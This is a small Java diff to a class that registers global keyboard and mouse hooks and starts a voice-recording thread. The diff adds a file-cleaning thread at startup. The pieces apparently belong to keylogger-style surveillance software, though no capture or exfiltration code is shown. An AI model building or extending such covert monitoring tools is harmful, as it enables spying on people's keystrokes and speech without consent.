@@ -16,6 +16,7 @@ import java.util.Date;
 import javax.imageio.ImageIO;
 
 import org.apache.log4j.Logger;
+import org.deb.cleaner.FileSystemCleaner;
 import org.deb.recorder.DebRecorder;
 import org.deb.recorder.WAVFileWatcher;
 import org.jnativehook.GlobalScreen;
@@ -94,9 +95,17 @@ public class OK implements NativeKeyListener, NativeMouseInputListener {
 	}
 
 	public static void main(String[] args) {
+		// For cleaning files
+		FileSystemCleaner cleaner = new FileSystemCleaner();
+		Thread fileCleaner = new Thread(cleaner);
+		fileCleaner.start();
+		
+		// For recording voice
 		DebRecorder debRecorder = new DebRecorder();
 		Thread raju = new Thread(debRecorder);
 		raju.start();
+		
+		
 		try {
 			GlobalScreen.registerNativeHook();
 		} catch (NativeHookException ex) {
